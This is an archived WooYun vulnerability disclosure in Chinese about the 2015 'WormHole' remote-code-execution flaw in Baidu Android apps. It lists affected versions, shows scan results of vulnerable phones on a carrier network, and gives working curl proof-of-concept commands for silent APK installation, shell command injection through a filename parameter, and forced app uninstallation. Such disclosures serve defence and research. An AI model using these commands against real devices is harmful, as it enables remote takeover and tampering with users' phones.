{"id": 72775, "wybug_id": "wooyun-2015-0148406", "wybug_title": "WormHole虫洞漏洞总结报告(附检测结果与测试脚本)", "wybug_corp": "百度", "wybug_author": "瘦蛟舞", "wybug_date": "2015-10-21 17:46", "wybug_open_date": "2016-01-19 18:40", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["客户端安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-24：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-19：\t细节向公众公开  简要描述： wormhole 详细说明：  ###已知受影响应用以及版本---\n百度输入法  检测版本5.8.2.0\t百度音乐  检测版本5.6.5.0\t百度地图  检测版本8.7\t百度手机助手  检测版本6.6.0\t百度浏览器  检测版本6.1.13.0\t手机百度  检测版本6.9 \thao123  检测版本6.1  \t百度贴吧  检测版本6.9.2\t百度云  检测版本7.8   (7.10 fixed)\t百度视频  检测版本7.18.1  \t安卓市场  检测版本6.0.86 \t百度新闻  检测版本5.4.0.0 \t爱奇艺  检测版本6.0  (6.7 fixed)\n WooYun: 百度输入法安卓版存在远程获取信息控制用户行为漏洞（可恶意推入内容等4G网络内可找到目标）  WooYun: 百度手机助手远程静默安装启动应用漏洞(3G/4G环境下远程种马)  WooYun: 百度系应用安卓版远程代码执行漏洞(百度地图/输入法为例) 对前面的漏洞总结,以及一些跟进情况.###漏洞危害---1.该漏洞利用方法并不复杂,知道原理后即可轻松发起攻击2.利用条件也不苛刻,只要是手机在联网状态都有可能受到攻击,无论是 wifi 无线网络或者3G/4G 蜂窝网络3.此漏洞不受系统版本影响,在最新 android6.0上测试成功.4.漏洞可以达到如下攻击效果- 远程执行任意代码(可以达到 root 权限)- 远程静默安装应用- 远程启动任意应用- 远程静默添加联系人- 远程获取坐标位置信息/获取imei信息/获取应用安装信息- 远程读取写入文件###对蜂窝(3G/4G)网络检测结果---4G网络的 UE 检测 apn 结果如下\n123 && 123({\"apn\":\"ctlte\",\"subtype\":\"lte\",\"error\":0});\n对4G 网络两个 C 段的40310/6259端口进行探测并且使用getserviceinfo判断其漏洞 app.(并没做其他攻击,测试发现3G 的 UE 与4G 的 UE 是互通的,运营商内网极其庞大)\nDiscovered open port 40310/tcp on 10.142.2.189 com.baidu.searchboxDiscovered open port 40310/tcp on 10.142.2.14 com.baidu.BaiduMapDiscovered open port 40310/tcp on 10.142.2.66 com.baidu.searchbox_huawei  (华为手机预装) Discovered open port 40310/tcp on 10.142.2.221 com.baidu.searchboxDiscovered open port 40310/tcp on 10.142.2.52 com.baidu.netdiskDiscovered open port 40310/tcp on 10.142.2.144 com.baidu.searchboxDiscovered open port 40310/tcp on 10.142.2.204 com.baidu.searchboxDiscovered open port 40310/tcp on 10.142.2.60 com.baidu.searchboxDiscovered open port 40310/tcp on 10.142.2.16 \"com.baidu.tieba\"---Discovered open port 6259/tcp on 10.142.2.25 com.baidu.searchbox_huaweiDiscovered open port 6259/tcp on 10.142.2.65 com.baidu.BaiduMapDiscovered open port 6259/tcp on 10.142.2.204 com.hiapk.marketphoDiscovered open port 6259/tcp on 10.142.2.16 com.baidu.inputDiscovered open port 6259/tcp on 10.142.2.151 com.baidu.BaiduMap---Discovered open port 6259/tcp on 10.142.3.25  \"packagename\":\"com.baidu.searchbox\",\"version\":\"19\"Discovered open port 6259/tcp on 10.142.3.93  \"packagename\":\"com.baidu.appsearch\"Discovered open port 6259/tcp on 10.142.3.135  \"com.hiapk.marketpho\",\"version\":\"121\"Discovered open port 6259/tcp on 10.142.3.163  \"packagename\":\"com.hiapk.marketpho\"Discovered open port 6259/tcp on 10.142.3.117  \"com.baidu.browser.apps\",\"version\":\"121\"Discovered open port 6259/tcp on 10.142.3.43   \"com.qiyi.video\",\"version\":\"20\"Discovered open port 6259/tcp on 10.142.3.148  \"com.baidu.appsearch\",\"version\":\"121\"Discovered open port 6259/tcp on 10.142.3.196  \"com.baidu.input\",\"version\":\"16\"Discovered open port 6259/tcp on 10.142.3.204  \"com.baidu.BaiduMap\",\"version\":\"20\"Discovered open port 6259/tcp on 10.142.3.145  \"com.baidu.appsearch\",\"version\":\"121\"Discovered open port 6259/tcp on 10.142.3.188  \"com.hiapk.marketpho\",\"version\":\"21\"---Discovered open port 40310/tcp on 10.142.3.53  \"com.baidu.BaiduMap\",\"version\":\"122\"Discovered open port 40310/tcp on 10.142.3.162  \"com.ting.mp3.android\",\"version\":\"122\"Discovered open port 40310/tcp on 10.142.3.139 \"com.baidu.searchbox\",\"version\":\"122\"Discovered open port 40310/tcp on 10.142.3.143 \"com.baidu.BaiduMap\",\"version\":\"122\"Discovered open port 40310/tcp on 10.142.3.45 file not found  (netdisk fixed version)Discovered open port 40310/tcp on 10.142.3.176  \"packagename\":\"com.baidu.searchbox\"\n   漏洞证明：  ###远程执行 root 命令\ncurl -F file=@1.apk -e http://m.baidu.com -H \"remote-addr: 127.0.0.1\" http://192.168.1.102:40310/uploadfile\\?install_type\\=all\\&callback\\=123\\&mcmdf\\=inapp_123\\&Filename\\=1.apk\n已经有了远程静默安装的 poc,因为是带入 exec 方法,并且使用拼接的方式,那么就考虑考虑截断远程执行命令了.\ncurl -F file=@1.apk -e http://m.baidu.com -H \"remote-addr: 127.0.0.1\" http://192.168.1.102:40310/uploadfile\\?install_type\\=all\\&callback\\=123\\&mcmdf\\=inapp_123\\&Filename\\=1.apk\\'\\;\\'whoami\n\n\n附带一个更有意思的 exp,替换百度浏览器为 UC 浏览器如果用户没有 root 权限,可以使用如下 poc提示协助.\ncurl -e http://m.baidu.com -H \"remote-addr: 127.0.0.1\" http://192.168.1.102:40310/sendintent?callback=123&mcmdf=inapp_xxx&intent=intent%3Apackage%3Acom.baidu.browser.apps%23Intent%3Baction%3Dandroid.intent.action.DELETE%3Bend\n\n\n如果 root 了那就可以静默完成这些了...\ncurl -F file=@1.apk -e http://m.baidu.com -H \"remote-addr: 127.0.0.1\" http://192.168.1.102:40310/uploadfile\\?install_type\\=all\\&callback\\=123\\&mcmdf\\=inapp_123\\&Filename\\=1.apk\\'\\;pm%20uninstall%20\\'com.baidu.browser.apps\n\n\n本意是协助百度尽快修复漏洞,所以提供了一个检测脚本在测试代码中.   修复方案：     版权声明：转载请注明来源 瘦蛟舞@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-10-21 18:30 厂商回复： 感谢您对百度安全你的关注,此漏洞已知晓且mo + sdk已修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-10-21 17:52 |    \t\t玉林嘎  \t\t\t( 核心白帽子 |\t\t\t        Rank:900 漏洞数:105        )\t\t \n  前排！    \n     2015-10-21 17:54 |    \t\t故滨 \t\t\t( 普通白帽子  |\t\t\t        Rank:291 漏洞数:40        )\t\t \n  这个不应该是cncert吗，怎么变成百度了    \n     2015-10-21 19:08 |    \t\tMark0smith \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:36        )\t\t \n  wow    \n     2015-10-28 12:39 |    \t\t蚕豆网(乌云厂商)\t\t \n  速度真快    \n     2015-10-28 13:57 |    \t\txsser_w \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:34        | 哎)\t\t \n  这个要打雷 给$ 置顶阿。。 用户超亿了    \n     2015-10-28 19:28 |    \t\tzzzmode \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:2        | )\t\t \n  libBdMoplusMD5_V1.so 出问题了？    \n     2015-10-29 02:36 |    \t\t麻辣烫 \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:10        | wooyun是一个学习的好地方.)\t\t \n  http://zone.wooyun.org/content/23346    \n     2015-10-29 11:25 |    \t\t小杰哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:29        | 逆水行舟，不进则退。)\t\t \n  @xsser_w 你暴露了 两个都是你发的？    \n     2015-10-29 17:35 |    \t\txsser_w \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:34        | 哎)\t\t \n  @小杰哥 不是阿  是路人甲发的    \n     2015-10-29 18:36 |    \t\tliutao0532 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:7        | b.b.b)\t\t \n  百度全家桶现已加入豪华午餐    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}